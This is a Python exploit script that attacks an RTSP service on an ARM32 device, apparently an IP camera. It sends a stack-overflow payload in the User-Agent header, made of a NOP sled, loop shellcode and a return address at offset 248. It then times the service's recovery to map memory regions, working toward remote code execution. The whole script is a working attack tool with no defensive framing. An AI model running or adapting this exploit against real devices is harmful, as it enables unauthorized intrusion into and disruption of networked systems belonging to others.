#!/usr/bin/env python3
"""
rtsp_addrspace.py — Quick address space map, 8 probes total (~2 min)

We need to know: what's ABOVE 0x40F40000?
  FAST (~2s)  = unmapped page → SIGSEGV immediately
  HIT  (~9.7s) = mapped+executable code
  PANIC (17-74s) = hardware MMIO or kernel space
  DEAD (>90s) = our shellcode loop running → RCE!

8 probes × 15s timeout = ~2 minutes max.
"""

import socket, time, struct

TARGET    = "█████████████"
RTSP_PORT = 554
PC_OFFSET = 248

ARM_NOP  = b'\x01\x10\xa0\xe1'
ARM_LOOP = b'\xfe\xff\xff\xea'
LOOP_PAYLOAD = ARM_NOP * 61 + ARM_LOOP   # 248 bytes

def rtsp_alive(timeout=5):
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((TARGET, RTSP_PORT))
        s.sendall(b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\nCSeq:1\r\n\r\n")
        d = b""
        try: d = s.recv(256)
        except: pass
        s.close()
        return b"RTSP" in d
    except:
        return False

def wait_rtsp(max_wait=120, label=""):
    t0 = time.time()
    while time.time() - t0 < max_wait:
        if rtsp_alive():
            e = time.time() - t0
            if e > 2: print(f"  [✓] RTSP alive ({label}) — waited {e:.0f}s", flush=True)
            return True
        time.sleep(1.5)
    print(f"  [✗] RTSP DEAD {max_wait}s ({label})", flush=True)
    return False

def probe(addr, poll_timeout=20):
    wait_rtsp(120, "pre")
    payload = LOOP_PAYLOAD + struct.pack('<I', addr)
    req = (b"DESCRIBE rtsp://" + TARGET.encode() + b":554/live RTSP/1.0\r\n"
           b"CSeq: 1\r\nUser-Agent: " + payload + b"\r\n\r\n")
    t0 = time.time()
    try:
        s = socket.socket(); s.settimeout(8)
        s.connect((TARGET, RTSP_PORT)); s.sendall(req)
        try: s.recv(256)
        except: pass
        s.close()
    except: pass

    PROBE = b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\nCSeq:99\r\n\r\n"
    deadline = t0 + poll_timeout
    while time.time() < deadline:
        time.sleep(0.3)
        try:
            s2 = socket.socket(); s2.settimeout(3)
            s2.connect((TARGET, RTSP_PORT))
            s2.sendall(PROBE)
            d = b""
            try: d = s2.recv(256)
            except: pass
            s2.close()
            if b"RTSP" in d:
                t = time.time() - t0
                if   t < 4:  tag = "FAST"
                elif t < 20: tag = "HIT"
                elif t < 70: tag = "PANIC"
                else:        tag = "DEAD"
                return t, tag
        except: pass
    return time.time() - t0, "DEAD"


# Quick survey of address space above the kernel-panic boundary
SURVEY = [
    # Just above panic boundary
    0x40F50000, 0x40F80000,
    # Common thread-stack / heap regions for ARM32 Linux
    0x41000000, 0x42000000,
    0x44000000, 0x48000000,
    0x50000000,
    # High user space (main thread stack / brk)
    0x7F000000,
]

print("=" * 60)
print("Address space survey above 0x40F40000")
print("  FAST  (~2s)  = unmapped (SIGSEGV)")
print("  HIT   (~9.7s) = mapped executable")
print("  PANIC (>17s) = MMIO / kernel")
print("  DEAD  (>90s) = shellcode running! RCE!")
print("=" * 60)
wait_rtsp(120, "start")

results = {}
for addr in SURVEY:
    t, tag = probe(addr, poll_timeout=20)
    t_str = f"{t:.1f}s" if t else "None"
    print(f"  0x{addr:08x}: {t_str:6s}  [{tag}]", flush=True)
    results[addr] = tag
    if tag == "DEAD":
        print(f"  *** RCE at 0x{addr:08x}! ***")
        break
    wait_rtsp(60, f"after 0x{addr:08x}")

print()
print("Summary:")
for addr, tag in results.items():
    print(f"  0x{addr:08x}: {tag}")

# Interpret results
hit_above = [a for a, t in results.items() if t in ("HIT", "DEAD")]
fast_above = [a for a, t in results.items() if t == "FAST"]
if fast_above:
    print(f"\nFAST (unmapped): {[hex(a) for a in fast_above]}")
    print("  → thread stack is NOT at these addresses")
if hit_above:
    print(f"\nHIT (mapped+exec): {[hex(a) for a in hit_above]}")
    print("  → more mapped regions found! thread stack might be here")
    print("  → run rtsp_stack_rce.py targeting these regions")
